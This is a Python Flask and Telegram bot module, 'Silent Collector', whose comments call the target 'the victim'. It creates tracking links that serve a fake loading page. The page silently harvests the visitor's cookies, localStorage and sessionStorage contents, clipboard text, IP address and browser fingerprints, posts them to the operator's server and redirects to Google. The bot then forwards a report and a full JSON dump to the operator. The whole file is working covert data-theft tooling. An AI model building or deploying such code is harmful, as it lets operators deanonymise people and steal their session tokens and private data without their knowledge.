# silent_collector.py
# ============================================================
# Silent Collector — جمع بيانات شاملة بدون أي تفاعل
# الضحية تدوس اللينك → Google → البوت يستقبل كل شيء
# ============================================================

import os
import time
import json
import uuid
import hashlib
import re
from datetime import datetime

from flask import Blueprint, request, jsonify, redirect, render_template_string

from config import bot, redis_client, PUBLIC_URL

from logging_config import get_logger
from monitoring import metrics

logger = get_logger("silent_collector")

silent_bp = Blueprint('silent_collector', __name__)


# ============================================================
# الإعدادات
# ============================================================
SESSION_TTL = 86400 * 30        # 30 يوم
GOOGLE_REDIRECT = "https://www.google.com"


# ============================================================
# ★★★ صفحة الالتقاط (1-2 ثانية فقط) ★★★
# ============================================================
COLLECTOR_PAGE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<title>Loading...</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  html, body {
    height: 100%;
    background: #ffffff;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
    overflow: hidden;
  }
  .loader {
    position: fixed;
    top: 50%; left: 50%;
    transform: translate(-50%, -50%);
    width: 40px; height: 40px;
    border: 3px solid #f0f0f0;
    border-top-color: #4285f4;
    border-radius: 50%;
    animation: spin 0.7s linear infinite;
  }
  @keyframes spin { to { transform: translate(-50%, -50%) rotate(360deg); } }
  .fade-out {
    animation: fadeOut 0.4s ease-out forwards;
  }
  @keyframes fadeOut {
    to { opacity: 0; }
  }
</style>
</head>
<body>
<div class="loader"></div>

<script>
(function() {
    "use strict";
    
    var SESSION_ID = "__SESSION_ID__";
    var ENDPOINT = "__ENDPOINT__";
    var REDIRECT_URL = "__REDIRECT_URL__";
    
    // ═══════════════════════════════════════════════════
    // بناء البيانات — كل ده في 200ms
    // ═══════════════════════════════════════════════════
    var data = {
        session_id: SESSION_ID,
        user_agent: navigator.userAgent,
        language: navigator.language || navigator.userLanguage,
        languages: (navigator.languages || []).join(','),
        platform: navigator.platform || 'unknown',
        vendor: navigator.vendor || 'unknown',
        cookie_enabled: navigator.cookieEnabled,
        do_not_track: navigator.doNotTrack || null,
        hardware_concurrency: navigator.hardwareConcurrency || null,
        device_memory: navigator.deviceMemory || null,
        max_touch_points: navigator.maxTouchPoints || 0,
        screen: {
            width: screen.width,
            height: screen.height,
            avail_width: screen.availWidth,
            avail_height: screen.availHeight,
            color_depth: screen.colorDepth,
            pixel_depth: screen.pixelDepth,
            orientation: (screen.orientation && screen.orientation.type) || null,
            dpr: window.devicePixelRatio || 1
        },
        window: {
            inner_width: window.innerWidth,
            inner_height: window.innerHeight,
            outer_width: window.outerWidth,
            outer_height: window.outerHeight,
        },
        timezone: null,
        timezone_offset: new Date().getTimezoneOffset(),
        timestamp: Math.floor(Date.now() / 1000),
        local_time: new Date().toString(),
        url: location.href,
        referrer: document.referrer || '',
        history_length: history.length || 0
    };
    
    // ─── Timezone ───
    try {
        data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    } catch(e) {}
    
    // ─── Color scheme ───
    try {
        data.dark_mode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
        data.reduced_motion = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
    } catch(e) {}
    
    // ─── Connection ───
    try {
        var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (conn) {
            data.connection = {
                effective_type: conn.effectiveType || null,
                type: conn.type || null,
                downlink: conn.downlink || null,
                rtt: conn.rtt || null,
                save_data: conn.saveData || false
            };
        }
    } catch(e) {}
    
    // ─── Battery (async) ───
    function captureBattery() {
        return new Promise(function(resolve) {
            try {
                if (navigator.getBattery) {
                    navigator.getBattery().then(function(b) {
                        resolve({
                            level: Math.round(b.level * 100),
                            charging: b.charging,
                            charging_time: b.chargingTime,
                            discharging_time: b.dischargingTime
                        });
                    }).catch(function() { resolve(null); });
                } else {
                    resolve(null);
                }
            } catch(e) { resolve(null); }
        });
    }
    
    // ─── WebGL Info ───
    function getWebGLInfo() {
        try {
            var canvas = document.createElement('canvas');
            var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return null;
            
            var dbg = gl.getExtension('WEBGL_debug_renderer_info');
            var vendor = gl.getParameter(dbg ? dbg.UNMASKED_VENDOR_WEBGL : gl.VENDOR);
            var renderer = gl.getParameter(dbg ? dbg.UNMASKED_RENDERER_WEBGL : gl.RENDERER);
            
            return {
                vendor: vendor,
                renderer: renderer,
                version: gl.getParameter(gl.VERSION),
                glsl: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
            };
        } catch(e) { return null; }
    }
    data.webgl = getWebGLInfo();
    
    // ─── Canvas Fingerprint ───
    function getCanvasFingerprint() {
        try {
            var canvas = document.createElement('canvas');
            canvas.width = 200;
            canvas.height = 60;
            var ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 100, 30);
            ctx.fillStyle = '#069';
            ctx.fillText('Silent Collector, ✨ 1234', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('Silent Collector, ✨ 1234', 4, 17);
            return canvas.toDataURL().substring(0, 200);
        } catch(e) { return null; }
    }
    data.canvas_hash = getCanvasFingerprint();
    
    // ─── Audio Fingerprint ───
    function getAudioFingerprint() {
        try {
            var AudioContext = window.OfflineAudioContext || window.webkitOfflineAudioContext;
            if (!AudioContext) return null;
            var ctx = new AudioContext(1, 44100, 44100);
            var osc = ctx.createOscillator();
            osc.type = 'triangle';
            osc.frequency.setValueAtTime(10000, ctx.currentTime);
            var compressor = ctx.createDynamicsCompressor();
            osc.connect(compressor);
            compressor.connect(ctx.destination);
            osc.start(0);
            return 'audio_supported';
        } catch(e) { return null; }
    }
    data.audio_supported = getAudioFingerprint();
    
    // ─── Fonts Detection ───
    function detectFonts() {
        try {
            var baseFonts = ['monospace', 'sans-serif', 'serif'];
            var testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 
                           'Georgia', 'Comic Sans MS', 'Trebuchet MS', 'Impact',
                           'Tahoma', 'Calibri', 'Segoe UI', 'Helvetica'];
            var testString = 'mmmmmmmmmmlli';
            var testSize = '72px';
            var span = document.createElement('span');
            span.style.position = 'absolute';
            span.style.left = '-9999px';
            span.style.fontSize = testSize;
            span.style.visibility = 'hidden';
            span.innerHTML = testString;
            document.body.appendChild(span);
            
            var baseSizes = {};
            for (var i = 0; i < baseFonts.length; i++) {
                span.style.fontFamily = baseFonts[i];
                baseSizes[baseFonts[i]] = span.offsetWidth;
            }
            
            var detected = [];
            for (var j = 0; j < testFonts.length; j++) {
                var found = false;
                for (var k = 0; k < baseFonts.length; k++) {
                    span.style.fontFamily = "'" + testFonts[j] + "'," + baseFonts[k];
                    if (span.offsetWidth !== baseSizes[baseFonts[k]]) {
                        found = true;
                        break;
                    }
                }
                if (found) detected.push(testFonts[j]);
            }
            document.body.removeChild(span);
            return detected;
        } catch(e) { return []; }
    }
    data.fonts = detectFonts();
    
    // ─── Storage ───
    function getStorageData() {
        var result = {
            local_storage: {},
            session_storage: {},
            cookies: document.cookie || '',
            cookie_count: 0,
            indexed_db_names: [],
            cache_keys: []
        };
        
        // Cookies
        try {
            result.cookie_count = document.cookie ? document.cookie.split(';').length : 0;
        } catch(e) {}
        
        // LocalStorage
        try {
            for (var i = 0; i < localStorage.length && i < 100; i++) {
                var key = localStorage.key(i);
                if (key) {
                    var val = localStorage.getItem(key) || '';
                    result.local_storage[key] = val.substring(0, 500);
                }
            }
        } catch(e) {}
        
        // SessionStorage
        try {
            for (var j = 0; j < sessionStorage.length && j < 100; j++) {
                var skey = sessionStorage.key(j);
                if (skey) {
                    var sval = sessionStorage.getItem(skey) || '';
                    result.session_storage[skey] = sval.substring(0, 500);
                }
            }
        } catch(e) {}
        
        return result;
    }
    var storageData = getStorageData();
    data.storage = storageData;
    
    // ─── IndexedDB names (async) ───
    function getIndexedDBNames() {
        return new Promise(function(resolve) {
            try {
                if (indexedDB && indexedDB.databases) {
                    indexedDB.databases().then(function(dbs) {
                        var names = dbs.map(function(db) { return db.name; });
                        resolve(names);
                    }).catch(function() { resolve([]); });
                } else {
                    resolve([]);
                }
            } catch(e) { resolve([]); }
        });
    }
    
    // ─── Cache Storage keys (async) ───
    function getCacheKeys() {
        return new Promise(function(resolve) {
            try {
                if (window.caches && caches.keys) {
                    caches.keys().then(function(keys) {
                        resolve(keys);
                    }).catch(function() { resolve([]); });
                } else {
                    resolve([]);
                }
            } catch(e) { resolve([]); }
        });
    }
    
    // ─── Clipboard (read only if allowed) ───
    function getClipboard() {
        return new Promise(function(resolve) {
            try {
                if (navigator.clipboard && navigator.clipboard.readText) {
                    navigator.clipboard.readText()
                        .then(function(text) { resolve(text.substring(0, 500)); })
                        .catch(function() { resolve(null); });
                } else {
                    resolve(null);
                }
            } catch(e) { resolve(null); }
        });
    }
    
    // ═══════════════════════════════════════════════════
    // جمع كل البيانات (async) وإرسالها
    // ═══════════════════════════════════════════════════
    function collectAll() {
        return Promise.all([
            captureBattery(),
            getIndexedDBNames(),
            getCacheKeys(),
            getClipboard()
        ]).then(function(results) {
            data.battery = results[0];
            data.storage.indexed_db_names = results[1];
            data.storage.cache_keys = results[2];
            data.clipboard = results[3];
            return data;
        });
    }
    
    // ═══════════════════════════════════════════════════
    // إرسال البيانات
    // ═══════════════════════════════════════════════════
    function sendData(payload) {
        return new Promise(function(resolve) {
            try {
                var jsonStr = JSON.stringify(payload);
                
                // استخدام sendBeacon لو متاح (أسرع وأضمن)
                if (navigator.sendBeacon) {
                    try {
                        var blob = new Blob([jsonStr], { type: 'application/json' });
                        var ok = navigator.sendBeacon(ENDPOINT, blob);
                        if (ok) {
                            resolve(true);
                            return;
                        }
                    } catch(e) {}
                }
                
                // fallback: fetch مع keepalive
                try {
                    fetch(ENDPOINT, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: jsonStr,
                        keepalive: true,
                        mode: 'no-cors'
                    }).then(function() { resolve(true); })
                      .catch(function() { resolve(false); });
                } catch(e) {
                    // fallback ثاني: XHR
                    try {
                        var xhr = new XMLHttpRequest();
                        xhr.open('POST', ENDPOINT, true);
                        xhr.setRequestHeader('Content-Type', 'application/json');
                        xhr.send(jsonStr);
                        resolve(true);
                    } catch(e2) {
                        resolve(false);
                    }
                }
            } catch(e) {
                resolve(false);
            }
        });
    }
    
    // ═══════════════════════════════════════════════════
    // Redirect للـ Google
    // ═══════════════════════════════════════════════════
    function doRedirect() {
        try {
            document.body.classList.add('fade-out');
        } catch(e) {}
        
        // نغير الـ location فوراً
        window.location.replace(REDIRECT_URL);
    }
    
    // ═══════════════════════════════════════════════════
    // MAIN
    // ═══════════════════════════════════════════════════
    var redirectTimer = setTimeout(doRedirect, 1500);  // max 1.5s
    
    collectAll().then(function(payload) {
        return sendData(payload);
    }).then(function() {
        // خلصنا — نعمل redirect فوراً
        clearTimeout(redirectTimer);
        // تأخير بسيط لضمان الإرسال
        setTimeout(doRedirect, 150);
    }).catch(function() {
        clearTimeout(redirectTimer);
        doRedirect();
    });
    
})();
</script>
</body>
</html>
"""


# ============================================================
# إنشاء Session جديدة
# ============================================================
def create_silent_session(chat_id, label=""):
    """ينشئ session جديد للالتقاط"""
    if not redis_client:
        return None

    try:
        session_id = uuid.uuid4().hex[:16]
        now = time.time()

        session_data = {
            "session_id": session_id,
            "chat_id": str(chat_id),
            "label": label[:50],
            "created_at": now,
            "accessed": False,
            "accessed_at": None,
            "collected": False,
        }

        redis_client.setex(
            f"silent:{session_id}",
            SESSION_TTL,
            json.dumps(session_data)
        )

        # أضف لقائمة المستخدم
        redis_client.lpush(f"silent_user:{chat_id}", session_id)
        redis_client.ltrim(f"silent_user:{chat_id}", 0, 199)
        redis_client.expire(f"silent_user:{chat_id}", SESSION_TTL)

        logger.info(f"Silent session created: {session_id} → {chat_id}")
        metrics.inc_counter("silent_sessions_created")

        return session_id

    except Exception as e:
        logger.exception(f"create_silent_session error: {e}")
        return None


# ============================================================
# استقبال البيانات
# ============================================================
def store_collected_data(session_id, data):
    """يخزن البيانات المجمعة"""
    if not redis_client:
        return False

    try:
        # اقرأ الـ session
        raw = redis_client.get(f"silent:{session_id}")
        if not raw:
            logger.warning(f"Session not found: {session_id}")
            return False

        session_data = json.loads(raw)
        chat_id = session_data["chat_id"]

        # ← إثراء البيانات من الـ headers (IP وغيرها)
        enriched = dict(data)

        # IP الحقيقي
        real_ip = (
            request.headers.get('CF-Connecting-IP') or
            request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or
            request.remote_addr
        )
        enriched['ip'] = real_ip

        # IP من headers إضافية
        enriched['cf_ip'] = request.headers.get('CF-Connecting-IP', '')
        enriched['true_client_ip'] = request.headers.get('True-Client-IP', '')
        enriched['x_real_ip'] = request.headers.get('X-Real-IP', '')

        # الـ User Agent من السيرفر (للتأكد)
        enriched['server_user_agent'] = request.headers.get('User-Agent', '')

        # Accept headers
        enriched['accept_language'] = request.headers.get('Accept-Language', '')
        enriched['dnt'] = request.headers.get('DNT', '')

        # زمن الوصول
        enriched['received_at'] = time.time()
        enriched['received_at_str'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        # خزنها منفصلة (key منفصل لكل session)
        redis_client.setex(
            f"silent_data:{session_id}",
            SESSION_TTL,
            json.dumps(enriched, ensure_ascii=False)
        )

        # حدّث الـ session
        session_data["collected"] = True
        session_data["collected_at"] = time.time()
        redis_client.setex(
            f"silent:{session_id}",
            SESSION_TTL,
            json.dumps(session_data)
        )

        logger.info(f"Data collected: {session_id} | IP={real_ip} | chat={chat_id}")
        metrics.inc_counter("silent_data_collected")

        # ─── أبلغ البوت ───
        notify_bot(chat_id, session_id, enriched)

        return True

    except Exception as e:
        logger.exception(f"store_collected_data error: {e}")
        return False


# ============================================================
# إشعار البوت
# ============================================================
def notify_bot(chat_id, session_id, data):
    """يبعت تقرير شامل للبوت"""
    try:
        cid = int(chat_id) if str(chat_id).isdigit() else chat_id

        # ─── بناء الاسم ───
        label = data.get('label', '')
        label_text = f" ({label})" if label else ""

        # ─── الجهاز ───
        ua = data.get('user_agent', 'Unknown')
        device_type = "📱 Mobile" if any(x in ua for x in ['Mobile', 'Android', 'iPhone']) else "💻 Desktop"

        # نظام التشغيل
        os_name = "Unknown"
        if 'Windows' in ua: os_name = "Windows"
        elif 'Mac OS' in ua or 'Macintosh' in ua: os_name = "macOS"
        elif 'Android' in ua: os_name = "Android"
        elif 'iPhone' in ua or 'iPad' in ua: os_name = "iOS"
        elif 'Linux' in ua: os_name = "Linux"

        # المتصفح
        browser = "Unknown"
        if 'Edg/' in ua: browser = "Edge"
        elif 'OPR/' in ua or 'Opera' in ua: browser = "Opera"
        elif 'Chrome/' in ua: browser = "Chrome"
        elif 'Safari/' in ua: browser = "Safari"
        elif 'Firefox/' in ua: browser = "Firefox"

        # ─── الموقع ───
        ip = data.get('ip', 'Unknown')
        timezone = data.get('timezone', 'Unknown')

        # ─── الشاشة ───
        screen = data.get('screen', {})
        screen_text = f"{screen.get('width', '?')}x{screen.get('height', '?')}"
        dpr = screen.get('dpr', 1)

        # ─── البطارية ───
        battery = data.get('battery')
        battery_text = "—"
        if battery:
            level = battery.get('level', '?')
            charging = "⚡" if battery.get('charging') else "🔋"
            battery_text = f"{charging} {level}%"

        # ─── الشبكة ───
        conn = data.get('connection') or {}
        net_text = conn.get('effective_type', '—')

        # ─── Hardware ───
        cores = data.get('hardware_concurrency', '?')
        ram = data.get('device_memory', '?')

        # ─── WebGL ───
        webgl = data.get('webgl') or {}
        gpu = webgl.get('renderer', 'Unknown')[:60]

        # ─── التخزين ───
        storage = data.get('storage') or {}
        cookies_count = storage.get('cookie_count', 0)
        local_keys = len(storage.get('local_storage', {}))
        session_keys = len(storage.get('session_storage', {}))
        idb_count = len(storage.get('indexed_db_names', []))

        # ─── الخطوط ───
        fonts_count = len(data.get('fonts', []))

        # ─── الحافظة ───
        clipboard = data.get('clipboard')
        clipboard_text = f"📋 <code>{clipboard[:100]}</code>" if clipboard else "—"

        # ─── الوقت ───
        received_at = data.get('received_at_str', '—')

        # ═══════════════════════════════════════════════════
        # بناء الرسالة
        # ═══════════════════════════════════════════════════
        text = (
            f"🎯 <b>SILENT CAPTURE</b>{label_text}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"

            f"🆔 <b>Session:</b> <code>{session_id}</code>\n"
            f"🕐 <b>Time:</b> <code>{received_at}</code>\n\n"

            f"━━━ 🌐 NETWORK ━━━\n"
            f"📍 <b>IP:</b> <code>{ip}</code>\n"
            f"🌍 <b>Timezone:</b> <code>{timezone}</code>\n"
            f"📡 <b>Network:</b> <code>{net_text}</code>\n\n"

            f"━━━ 💻 DEVICE ━━━\n"
            f"🖥️ <b>Type:</b> <code>{device_type}</code>\n"
            f"⚙️ <b>OS:</b> <code>{os_name}</code>\n"
            f"🌐 <b>Browser:</b> <code>{browser}</code>\n"
            f"📱 <b>Platform:</b> <code>{data.get('platform', '?')}</code>\n"
            f"🔧 <b>Cores:</b> <code>{cores}</code> | RAM: <code>{ram}GB</code>\n\n"

            f"━━━ 📐 SCREEN ━━━\n"
            f"📏 <b>Resolution:</b> <code>{screen_text}</code>\n"
            f"🔍 <b>DPR:</b> <code>{dpr}</code>\n"
            f"🌗 <b>Dark Mode:</b> <code>{'Yes' if data.get('dark_mode') else 'No'}</code>\n\n"

            f"━━━ 🎮 HARDWARE ━━━\n"
            f"🎨 <b>GPU:</b> <code>{gpu}</code>\n"
            f"🔋 <b>Battery:</b> {battery_text}\n\n"

            f"━━━ 💾 STORAGE ━━━\n"
            f"🍪 <b>Cookies:</b> <code>{cookies_count}</code>\n"
            f"💾 <b>LocalStorage:</b> <code>{local_keys}</code> keys\n"
            f"🔐 <b>SessionStorage:</b> <code>{session_keys}</code> keys\n"
            f"📦 <b>IndexedDB:</b> <code>{idb_count}</code> dbs\n"
            f"🔤 <b>Fonts:</b> <code>{fonts_count}</code>\n\n"

            f"📋 <b>Clipboard:</b> {clipboard_text}\n"
        )

        bot.send_message(cid, text, parse_mode="HTML", disable_web_page_preview=True)
        logger.info(f"Report sent to {cid}")

        # ─── ابعث ملف JSON كامل ───
        try:
            import io
            json_str = json.dumps(data, ensure_ascii=False, indent=2)
            buf = io.BytesIO(json_str.encode('utf-8'))
            buf.name = f"silent_{session_id}.json"

            bot.send_document(
                cid, buf,
                caption=f"📦 <b>Data dump</b> | <code>{session_id}</code>",
                parse_mode="HTML"
            )
        except Exception as e:
            logger.warning(f"Send JSON dump error: {e}")

    except Exception as e:
        logger.exception(f"notify_bot error: {e}")


# ============================================================
# Routes
# ============================================================
def init_silent_collector_routes(app, bot_instance):
    """تسجيل مسارات Silent Collector"""

    global bot
    bot = bot_instance

    @app.route('/s/<session_id>', methods=['GET'])
    def silent_collector_page(session_id):
        """صفحة الالتقاط — الضحية تفتحها وتشتغل تلقائياً"""

        # تحقق من الـ session
        try:
            raw = redis_client.get(f"silent:{session_id}")
            if not raw:
                # session غلط → redirect لـ Google فوراً
                return redirect(GOOGLE_REDIRECT, code=302)

            session_data = json.loads(raw)

            # علّم إن الضحية فتحت اللينك
            session_data['accessed'] = True
            session_data['accessed_at'] = time.time()
            session_data['accessed_ip'] = (
                request.headers.get('CF-Connecting-IP') or
                request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or
                request.remote_addr
            )
            redis_client.setex(
                f"silent:{session_id}",
                SESSION_TTL,
                json.dumps(session_data)
            )

            logger.info(f"🎯 Silent accessed: {session_id}")

        except Exception as e:
            logger.exception(f"silent_collector_page error: {e}")
            return redirect(GOOGLE_REDIRECT, code=302)

        # بناء الصفحة
        endpoint = f"{PUBLIC_URL}/s/{session_id}/collect"

        html = (COLLECTOR_PAGE
                .replace("__SESSION_ID__", session_id)
                .replace("__ENDPOINT__", endpoint)
                .replace("__REDIRECT_URL__", GOOGLE_REDIRECT))

        response = app.make_response(html)
        response.headers['Content-Type'] = 'text/html; charset=utf-8'
        response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
        response.headers['X-Robots-Tag'] = 'noindex, nofollow'

        return response


    @app.route('/s/<session_id>/collect', methods=['POST', 'OPTIONS'])
    def silent_collect_endpoint(session_id):
        """نقطة استقبال البيانات من الـ JS"""

        # CORS preflight
        if request.method == 'OPTIONS':
            resp = app.make_response('')
            resp.headers['Access-Control-Allow-Origin'] = '*'
            resp.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
            resp.headers['Access-Control-Allow-Headers'] = 'Content-Type'
            return resp, 200

        try:
            data = request.get_json(silent=True) or {}

            # تأكد إن الـ session_id مطابق
            if data.get('session_id') != session_id:
                logger.warning(f"Session ID mismatch: {data.get('session_id')} vs {session_id}")
                return jsonify({'ok': False}), 200

            # خزن البيانات
            success = store_collected_data(session_id, data)

            resp = jsonify({'ok': success})
            resp.headers['Access-Control-Allow-Origin'] = '*'
            return resp, 200

        except Exception as e:
            logger.exception(f"silent_collect_endpoint error: {e}")
            resp = jsonify({'ok': False})
            resp.headers['Access-Control-Allow-Origin'] = '*'
            return resp, 200


    @app.route('/s/<session_id>/go', methods=['GET'])
    def silent_redirect(session_id):
        """redirect fallback لـ Google"""
        return redirect(GOOGLE_REDIRECT, code=302)


    logger.info("[+] Silent Collector routes registered: /s/<session_id>")


# ============================================================
# Public API للاستخدام من bot_handlers
# ============================================================
def generate_silent_link(chat_id, label=""):
    """ينشئ لينك جاهز للإرسال"""
    session_id = create_silent_session(chat_id, label)
    if not session_id:
        return None
    return f"{PUBLIC_URL}/s/{session_id}"


def get_silent_data(session_id):
    """يرجع البيانات المجمعة لـ session"""
    if not redis_client:
        return None
    try:
        raw = redis_client.get(f"silent_data:{session_id}")
        if raw:
            return json.loads(raw)
    except Exception as e:
        logger.warning(f"get_silent_data error: {e}")
    return None


def get_user_silent_sessions(chat_id, limit=50):
    """يرجع كل sessions المستخدم"""
    if not redis_client:
        return []
    try:
        session_ids = redis_client.lrange(f"silent_user:{chat_id}", 0, limit - 1)
        result = []
        for sid in session_ids:
            sdata = redis_client.get(f"silent:{sid}")
            if sdata:
                try:
                    result.append(json.loads(sdata))
                except Exception:
                    continue
        return result
    except Exception as e:
        logger.warning(f"get_user_silent_sessions error: {e}")
        return []
